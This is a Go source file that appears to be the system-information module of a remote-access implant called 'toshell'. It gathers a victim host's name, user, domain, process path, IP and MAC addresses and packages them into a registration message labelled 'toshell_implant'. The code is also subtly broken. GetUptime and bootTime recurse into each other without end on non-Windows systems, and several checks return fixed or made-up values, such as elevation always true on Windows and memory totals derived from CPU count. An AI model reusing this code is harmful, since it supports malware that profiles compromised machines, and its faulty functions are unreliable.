package sysinfo

import (
	"fmt"
	"net"
	"os"
	"os/user"
	"runtime"
	"time"

	"toshell/internal/common/protocol"
)

type SystemInfo struct {
	Hostname     string
	Username     string
	OS           string
	Arch         string
	PID          uint32
	ProcessPath  string
	IPAddresses  []string
	MACAddresses []string
	Domain       string
}


func Gather() (*SystemInfo, error) {
	info := &SystemInfo{}

	hostname, err := os.Hostname()
	if err != nil {
		return nil, fmt.Errorf("failed to get hostname: %w", err)
	}
	info.Hostname = hostname

	currentUser, err := user.Current()
	if err != nil {
		info.Username = "unknown"
	} else {
		info.Username = currentUser.Username
	}

	info.OS = runtime.GOOS
	info.Arch = runtime.GOARCH
	info.PID = uint32(os.Getpid())
	
	// 获取当前进程的完整路径
	if path, err := os.Executable(); err == nil {
		info.ProcessPath = path
	} else {
		info.ProcessPath = "unknown"
	}

	info.Domain = ""
	if domain := os.Getenv("USERDOMAIN"); domain != "" {
		info.Domain = domain
	}

	info.IPAddresses = getLocalIPs()
	info.MACAddresses = getMACAddresses()

	return info, nil
}

func GetSystemInfo() *SystemInfo {
	info, _ := Gather()
	if info != nil {
		return info
	}
	return &SystemInfo{
		Hostname:    "unknown",
		Username:    "unknown",
		OS:          runtime.GOOS,
		Arch:        runtime.GOARCH,
		ProcessPath: "unknown",
	}
}

func (s *SystemInfo) ToRegister() *protocol.Register {
	return &protocol.Register{
		Hostname:     s.Hostname,
		Username:     s.Username,
		OS:           s.OS,
		Arch:         s.Arch,
		PID:          s.PID,
		ProcessName:  "toshell_implant",
		ProcessPath:  s.ProcessPath,
		IPAddresses:  s.IPAddresses,
		MACAddresses: s.MACAddresses,
		Domain:       s.Domain,
	}
}


func getLocalIPs() []string {
	var ips []string

	interfaces, err := net.Interfaces()
	if err != nil {
		return ips
	}

	for _, iface := range interfaces {
		if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
			continue
		}

		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}

		for _, addr := range addrs {
			var ip net.IP
			switch v := addr.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			}

			if ip != nil && ip.To4() != nil {
				ips = append(ips, ip.String())
			}
		}
	}

	return ips
}

func getMACAddresses() []string {
	var macs []string

	interfaces, err := net.Interfaces()
	if err != nil {
		return macs
	}

	for _, iface := range interfaces {
		if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
			continue
		}

		mac := iface.HardwareAddr.String()
		if mac != "" {
			macs = append(macs, mac)
		}
	}

	return macs
}

func getWindowsIntegrity() string {
	return "Medium"
}

func GetUptime() time.Duration {
	start := time.Now()
	bootTime, err := bootTime()
	if err != nil {
		return time.Since(start)
	}
	return time.Since(bootTime)
}

func bootTime() (time.Time, error) {
	if runtime.GOOS == "windows" {
		return time.Now(), nil
	}

	now := time.Now()
	uptime := GetUptime()
	return now.Add(-uptime), nil
}

func GetLoadAverage() (float64, float64, float64) {
	return 0, 0, 0
}

func GetMemoryInfo() (total, used uint64) {
	var m runtime.MemStats
	runtime.ReadMemStats(&m)

	used = m.Alloc
	total = uint64(runtime.NumCPU()) * 1024 * 1024 * 1024

	return total, used
}

func GetCPUCount() int {
	return runtime.NumCPU()
}

func IsElevated() bool {
	if runtime.GOOS == "windows" {
		return true
	}

	return os.Geteuid() == 0
}

func GetProcessList() []ProcessInfo {
	return []ProcessInfo{}
}

type ProcessInfo struct {
	PID    uint32
	Name   string
	User   string
	CPU    float64
	Memory uint64
}

func IsRunningInContainer() bool {
	if _, err := os.Stat("/.dockerenv"); err == nil {
		return true
	}

	if _, err := os.Stat("/run/.containerenv"); err == nil {
		return true
	}

	return false
}

func IsRunningInVM() bool {
	return false
}

func GetDriveInfo() []DriveInfo {
	return []DriveInfo{}
}

type DriveInfo struct {
	Letter string
	Label  string
	Type   string
	Total  uint64
	Free   uint64
}

func GetNetworkInterfaces() []NetworkInterface {
	return []NetworkInterface{}
}

type NetworkInterface struct {
	Name   string
	IP     string
	Mask   string
	MAC    string
	Status string
}

func GetRoutes() []Route {
	return []Route{}
}

type Route struct {
	Destination string
	Gateway     string
	Mask       string
	Interface   string
}
